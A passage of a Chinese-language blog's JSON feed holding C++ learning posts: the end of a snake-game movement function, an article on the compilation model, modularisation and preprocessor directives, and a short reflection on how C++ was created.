punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// get the snake tail</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span> tail <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">.</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> tail_x <span class=\"token operator\">=</span> tail<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> tail_y <span class=\"token operator\">=</span> tail<span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// obtain the next position</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>direction<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">case</span> UP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        x <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">case</span> DOWN<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">case</span> RIGHT<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        y <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">case</span> LEFT<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        y <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\">// if the next position is '#' or snake body, exit the game</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'#'</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'S'</span> <span class=\"token operator\">&amp;&amp;</span> x <span class=\"token operator\">!=</span> tail_x <span class=\"token operator\">&amp;&amp;</span> y <span class=\"token operator\">!=</span> tail_y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        g<span class=\"token punctuation\">.</span>end <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">// if the next poistion is food</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'$'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        g<span class=\"token punctuation\">.</span>score <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>tail_x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>tail_y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token generic-function\"><span class=\"token function\">pair</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'S'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"bug-修复\"><a class=\"markdownIt-Anchor\" href=\"#bug-修复\">#</a> bug 修复</h1>\n<ol>\n<li><code>random()</code>  随机数产生需要在后面 +1</li>\n<li>为 <code>board</code>  新增 <code>plain</code>  字段，让蛇占据所有空间后，通知用户通关！</li>\n<li>长度为 1 时，可以反方向运动</li>\n</ol>\n",
            "tags": [
                "C++"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%B7%A5%E7%A8%8B%E6%9E%84%E5%BB%BA/",
            "url": "https://salvely.github.io/blog/2023/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%B7%A5%E7%A8%8B%E6%9E%84%E5%BB%BA/",
            "title": "C++编译与工程构建",
            "date_published": "2023-10-27T09:45:08.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>我们在课程中写的都是代码量不大的小文件，但是在实际工程开发中，情况可就不一样了。但是那么多的代码，我们不可能将它们放在同一个文件中，肯定要分成不同的源文件。但是如何分解程序？如何实现程序之间的交流，就成了一个问题。本节中我们将探讨如何将一个大的工程分成不同的源程序，并且实现这些源程序之间的交流。我们首先介绍 C++ 的编译模型，也就是 C++ 源程序是如何编译成为机器可理解的二进制代码的。然后，我们讨论如何将一个大的工程分解为多个小的源程序，并且实现他们之间的交流。最后，我们探讨 C++ 的预处理器的工作模式。</p>\n<h1 id=\"c-编译模型\"><a class=\"markdownIt-Anchor\" href=\"#c-编译模型\">#</a> C++ 编译模型</h1>\n<p>C++ 是一种编译型的语言，即通过编译器将源代码转化为机器可以理解的二进制代码。其编译过程分为 3 个阶段：</p>\n<ul>\n<li>预处理阶段：扩展头文件，进行宏替换等</li>\n<li>编译阶段：将预处理后的高级语言代码转化为机器可以理解的二进制代码，即目标文件。在这个阶段，编译器会检查一些语法错误，如漏掉了 <code>;</code>  等</li>\n<li>链接阶段：将生成的多个目标文件合并成一个最终的可执行文件</li>\n</ul>\n<p>语法错误主要集中在编译阶段进行检查，而程序的一些其他问题则多半是出现在链接阶段。例如，程序可能定义了一个函数的原型，并且对他进行了调用，但是却没有实现这个函数。又或者，定义的函数原型和实现不一样，按照函数原型进行调用以后，程序找不到函数的实现。有的人会奇怪为什么这种错误会出现在链接阶段，是因为链接器没有在这个文件中找到函数原型时，他会本能的想到是不是在需要链接的其他文件中。如果在其他文件中也没有找到的话，链接器才会告诉你出现了链接错误。</p>\n<h1 id=\"模块化与分解\"><a class=\"markdownIt-Anchor\" href=\"#模块化与分解\">#</a> 模块化与分解</h1>\n<p>通常来说，对于一个大的工程问题，我们无法一口气思考到所有的细节。而在这种情况下，我们倾向于将问题分解成不同的模块，然后通过不同模块间的合作和交流来解决。但是，如何确定模块划分的粒度呢？毕竟越往下分，细节就越多。而在这个时候，我们会选择使用一些抽象的接口。举个例子，我们无需设计 C++ STL，只需要调用其提供给我们的接口，便可以实现多种功能。而这就是模块划分的尽头。<br>\n对于模块化，通常来说遵循 3 个原则：</p>\n<ul>\n<li>简单化：提供一个较为简单的接口</li>\n<li>可扩展：在需要的时候，我们可以在不改变接口的条件下改变其实现方式。</li>\n<li>可复用：接口足够泛用（使用泛型，模板之类），可以保证函数可以被用在多个不同的项目中</li>\n</ul>\n<h1 id=\"c-预处理器\"><a class=\"markdownIt-Anchor\" href=\"#c-预处理器\">#</a> C++ 预处理器</h1>\n<h2 id=\"前言-2\"><a class=\"markdownIt-Anchor\" href=\"#前言-2\">#</a> 前言</h2>\n<p>在编写 C++ 程序时，我们通常把一个程序分为 <code>file.h</code>  和 <code>file.cpp</code>  两个部分。 <code>file.h</code>  中描述的是程序提供的类及函数接口（定义），而 <code>.cpp</code>  文件中描述的是其实现。此外，通常在 <code>.h</code>  文件的前后，会加上如下内容：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">StrUtils_Included</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">StrUtils_Included</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>string <span class=\"token function\">ConvertToUpperCase</span><span class=\"token punctuation\">(</span>string input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>string <span class=\"token function\">ConvertToLowerCase</span><span class=\"token punctuation\">(</span>string input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>string <span class=\"token function\">IntegerToString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>string <span class=\"token function\">DoubleToString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr></table></figure><h2 id=\"include头文件\"><a class=\"markdownIt-Anchor\" href=\"#include头文件\">#</a>  <code>include</code>  头文件</h2>\n<p>其作用在于将头文件的内容复制到 <code>#include</code>  处。头文件分为两种，一种用 <code>&lt;&gt;</code>  包起，是 C++ 标准库中的文件；而另外一种用 <code>&quot;&quot;</code>  包起，是用户自定义的头文件，编译器会在当前工程文件夹下找。</p>\n<h2 id=\"define定义与替换\"><a class=\"markdownIt-Anchor\" href=\"#define定义与替换\">#</a>  <code>define</code>  定义与替换</h2>\n<p>宏定义的基本格式是 <code>define val replacement</code> 。在进行宏替换时，做的不是值替换，而是普通的字符串的替换。即将程序中所有的 <code>val</code>  都替换成 <code>replacement</code> 。在进行宏替换时编译器并不理解这到底是什么东西，就是简单的左无脑替换。因此在替换时必须要注意，譬如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">a</span> <span class=\"token expression\"><span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在进行宏替换后，效果如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>而不是:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>因为它做的仅仅是简单的字符串替换。这种错误经常发生，而要避免这类错误的方法是：</p>\n<ol>\n<li>在 <code>define</code>  时使用 <code>()</code>  圆括号</li>\n<li>使用 <code>const</code>  语句</li>\n</ol>\n<h2 id=\"include-guard\"><a class=\"markdownIt-Anchor\" href=\"#include-guard\">#</a>  <code>include guard</code></h2>\n<p>预处理语句可以通过条件判断来决定是否要定义某些文件，一个简单的格式如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ifndef<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>define<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>endif</pre></td></tr></table></figure><p>这套语句的基本意思是：如果已经 <code>#include</code>  过上述文件，就不需要再定义一次了。C++ 工程文件之间相互 <code>#include</code>  是家常便饭，这样做是为了防止由于多次互相 <code>#include</code>  带来的重定义问题。上述语句只是一个较为简化的版本，更为完整的定义是：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">statement</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">elif</span> <span class=\"token expression\">another<span class=\"token operator\">-</span>statement</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">elif</span> <span class=\"token expression\">yet<span class=\"token operator\">-</span>another<span class=\"token operator\">-</span>statement</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr></table></figure><p>这其中的 <code>statement</code>  可以是条件判断语句，也可以是 <code>define()</code>  语句。做条件判断时，使用的必须是已经定义过的变量，如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">MY_CONSTANT <span class=\"token operator\">></span> <span class=\"token number\">137</span> </span><span class=\"token comment\">// Legal</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">MY_CONSTANT <span class=\"token operator\">*</span> <span class=\"token number\">42</span> <span class=\"token operator\">==</span> MY_CONSTANT </span><span class=\"token comment\">// Legal</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span>MY_CONSTANT<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> </span><span class=\"token comment\">// Illegal, cannot call function sqrt</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">MY_CONSTANT <span class=\"token operator\">==</span> <span class=\"token number\">3.14</span> </span><span class=\"token comment\">// Illegal, can only use integral values</span></span></pre></td></tr></table></figure><p>而使用 <code>define</code>  语句时，如果变量已经定义，则 <code>define()</code>  返回 <code>true</code> ，否则返回 <code>false</code> 。例如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>MY_CONSTANT<span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// Evaluates to true.</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>OTHER_CONSTANT<span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// Evaluates to false.</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token operator\">!</span><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>MY_CONSTANT<span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// Evaluates to false.</span></span></pre></td></tr></table></figure><p>其判断结果被应用在 <code>if</code>  语句中。例如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"A is defined.\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">elif</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>B<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"B is defined.\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">elif</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> \tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"C is defined.\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"None of A, B, or C is defined.\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr></table></figure><p>这套语句的效果相当于将所有 <code>include</code>  的内容复制粘贴到源程序中，但是注释掉重复定义的部分。它和注释不一样之处在于，这套语句可以嵌套，而注释不能。</p>\n<h2 id=\"宏\"><a class=\"markdownIt-Anchor\" href=\"#宏\">#</a> 宏</h2>\n<h2 id=\"内联函数\"><a class=\"markdownIt-Anchor\" href=\"#内联函数\">#</a> 内联函数</h2>\n",
            "tags": [
                "C++",
                "CMake",
                "Makefile"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%9D%82%E8%B0%88/C++%E7%9A%84%E8%AF%9E%E7%94%9F%E4%B8%8E%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/",
            "url": "https://salvely.github.io/blog/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%9D%82%E8%B0%88/C++%E7%9A%84%E8%AF%9E%E7%94%9F%E4%B8%8E%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/",
            "title": "C++的诞生与一些思考",
            "date_published": "2023-10-25T06:00:48.000Z",
            "content_html": "<p>最近在学习斯坦福的 CS106L，学习标准 C++。在阅读<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9mdWxsX2NvdXJzZV9yZWFkZXIucGRm\"> Course Reader</span> 的 Introduction 部分时，作者介绍了 C++ 的诞生故事，对我颇有启发。</p>\n<p>C++ 的创始人在剑桥大学读 PhD 时，主要研究的是分布式系统。在当时，他使用了一种叫 Simula 的面向对象语言。他在 Simula 中初始化电脑对象和网络对象，来模拟系统之间通过网络的交互。但是在开发的过程中，他发现，虽然使用 Simula 来对整个过程进行模拟，非常的快速，但是 Simula 的执行速度非常慢。而后，他又尝试通过一种名为 BCPL 的语言进行开发。但是新的问题又出现了，这种语言是一种较底层的系统语言，并不具备面向对象等特性。虽然执行速度快，但是搭建系统的过程非常的痛苦和繁琐。</p>\n<p>在博士毕业后，他来到了贝尔实验室工作。在这里他接触了一门高效的高级语言，C 语言。此后，他在 C 语言的基础上，拓展了类，而后又增加了一些新的特性。他把这种语言称之为 C++。</p>\n<p>从他的故事来看，再结合之前 OpenAI 创始人的书《伟大不能被计划》，我们可以看到，有的时候我们在探索目标的过程中，可能会遇到一些新的尚未发现过的东西，探索这项新知，可能会让我们更慢达到目标，但是可以让我们在沿途看到更多的风景。 C++ 创始人在研究分布式系统的过程中，意外创造了 C++ 语言。有的人可能会因为创造一门语言所需要的工作量而被劝退，殊不知这正是伟大的开端。有时候我们在是做事情时，可以多想一点点，多做一点点，多探索，多思考，多创造，而不是重复原有的工作，那正是创造力和新世界的大门。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/",
            "url": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/",
            "title": "C++参考资料",
            "date_published": "2023-10-22T08:47:56.000Z",
            "content_html": "<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pc29jcHAuZ2l0aHViLmlvL0NwcENvcmVHdWlkZWxpbmVzL0NwcENvcmVHdWlkZWxpbmVz\">C++ Core Guidelines</span></li>\n<li></li>\n</ul>\n",
            "tags": [
                "C++",
                "参考资料"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/",
            "url": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/",
            "title": "Stanford CS106L:Standard C++ Programming",
            "date_published": "2023-10-22T03:36:26.000Z",
